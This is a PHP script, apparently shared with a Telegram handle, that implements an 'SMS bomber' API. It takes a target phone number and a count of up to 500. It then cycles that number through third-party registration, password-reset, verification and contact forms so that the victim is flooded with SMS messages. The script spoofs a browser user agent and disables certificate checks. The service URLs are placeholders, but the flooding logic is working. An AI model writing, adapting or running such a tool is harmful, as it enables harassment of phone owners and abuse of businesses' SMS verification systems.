<?php
/**
 * SMS Bomber API
 * Telegram: @unutur
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

// ==================== SMS SERVİSLERİ ====================
$sms_services = [
    [
        "name" => "Üye Kayıt",
        "url" => "https://www.xyz.com/kayit",
        "method" => "POST",
        "fields" => ["telefon" => "{numara}", "ad" => "Test", "soyad" => "Kullanıcı"]
    ],
    [
        "name" => "Şifremi Unuttum",
        "url" => "https://www.abc.com/sifre-unuttum",
        "method" => "POST",
        "fields" => ["phone" => "{numara}", "email" => "test@test.com"]
    ],
    [
        "name" => "Doğrulama Kodu",
        "url" => "https://www.deneme.com/dogrula",
        "method" => "POST",
        "fields" => ["gsm" => "{numara}", "tip" => "sms"]
    ],
    [
        "name" => "İletişim Formu",
        "url" => "https://www.ornek.com/iletisim",
        "method" => "POST",
        "fields" => ["tel" => "{numero}", "mesaj" => "Bilgi almak istiyorum"]
    ],
    [
        "name" => "Randevu",
        "url" => "https://www.randevu.com/al",
        "method" => "POST",
        "fields" => ["telefon" => "{numara}", "tarih" => "bugun"]
    ]
];

// ==================== FONKSİYONLAR ====================
function send_sms($service, $phone) {
    $phone_clean = preg_replace('/[^0-9]/', '', $phone);
    if (!preg_match('/^0/', $phone_clean)) {
        $phone_clean = '0' . $phone_clean;
    }
    
    $data = [];
    foreach ($service['fields'] as $key => $value) {
        $data[$key] = str_replace('{numara}', $phone_clean, $value);
    }
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $service['url']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    
    if ($service['method'] == 'POST') {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    } else {
        $url = $service['url'] . '?' . http_build_query($data);
        curl_setopt($ch, CURLOPT_URL, $url);
    }
    
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return ($httpCode >= 200 && $httpCode < 300) ? 1 : 0;
}

// ==================== API ENDPOINT ====================
$phone = isset($_GET['telefon']) ? $_GET['telefon'] : (isset($_POST['telefon']) ? $_POST['telefon'] : null);
$count = isset($_GET['adet']) ? (int)$_GET['adet'] : (isset($_POST['adet']) ? (int)$_POST['adet'] : 50);

if (!$phone) {
    echo json_encode([
        'success' => false,
        'error' => 'Telefon numarası gerekli',
        'kullanım' => '/sms.php?telefon=5551234567&adet=50',
        'telegram' => '@unutur'
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

if ($count > 500) {
    echo json_encode([
        'success' => false,
        'error' => 'Maksimum 500 SMS gönderilebilir',
        'telegram' => '@unutur'
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

// ==================== SMS GÖNDER ====================
$sent = 0;
$services_count = count($sms_services);

for ($i = 0; $i < $count; $i++) {
    $service = $sms_services[$i % $services_count];
    $result = send_sms($service, $phone);
    $sent += $result;
    
    // Rate limit için bekle
    usleep(500000); // 0.5 saniye
}

// ==================== SONUÇ ====================
echo json_encode([
    'success' => true,
    'telefon' => $phone,
    'hedef' => $count,
    'gonderilen' => $sent,
    'basarili_orani' => round(($sent / $count) * 100, 1) . '%',
    'telegram' => '@unutur'
], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
?>